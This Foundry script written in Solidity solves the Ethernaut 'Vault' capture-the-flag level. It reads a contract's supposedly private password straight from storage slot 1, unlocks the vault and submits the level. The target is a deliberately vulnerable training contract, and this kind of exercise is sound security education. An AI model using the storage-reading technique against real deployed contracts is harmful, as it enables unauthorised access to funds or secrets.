// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";

import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Vault} from "../src/Vault.sol";

/**
 *
 * Level address: 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670
 * Unlock the vault to pass the level!
 *
 */
contract VaultScript is Attacker {
    Level private level = Level(0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Vault vault = Vault(instance);

        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        console.log("password: ", string(abi.encodePacked(password)));

        vault.unlock(password);
        console.log("Vault lock: ", vault.locked());

        require(submitInstance());
        vm.stopBroadcast();
    }
}
